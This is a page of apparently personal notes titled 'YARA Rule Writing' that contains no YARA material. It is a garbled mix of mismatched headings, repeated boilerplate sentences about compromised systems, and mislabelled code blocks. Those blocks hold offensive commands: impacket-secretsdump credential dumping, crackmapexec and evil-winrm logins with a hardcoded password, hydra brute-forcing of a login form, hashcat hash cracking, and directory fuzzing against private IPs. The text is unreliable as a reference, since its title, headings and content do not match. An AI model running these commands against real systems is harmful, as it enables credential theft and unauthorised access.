---
TitleSEO: "YARA Rule Writing | ZureFX"
TitlePost: "YARA Rule Writing"
Author: "ZureFX"
Description: "Personal notes on YARA Rule Writing. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, windows, persistence, dfir, enumeration"
URL: "https://zurefx.github.io/notes/note-yara-rule-writing-470.html"
URL_IMAGES: ""
Date: "2025-01-11"
Tags: "Blue Team, Windows, Persistence, DFIR, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-yara-rule-writing-470"
Permalink: "/notes/note-yara-rule-writing-470.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PHP

### ligolo-ng

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.61.191.197
crackmapexec smb 10.80.125.229 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.91.160.62 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.96.204
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## Bash

### Django

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
crackmapexec smb 10.29.119.25 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.44.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.246.51
```

## Apache

### MongoDB

- `sharphound`
- `LAPS Abuse`
- `ldapsearch`
- `wmiexec`
- `Sudo Misconfiguration`

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

- `Silver Ticket`
- `john`
- `kerbrute`
- `GetUserSPNs`
- `CSRF`

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

## FTP

### NTLM Relay

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.123.68.251/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.55.103.4 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.58.238.13/FUZZ
```
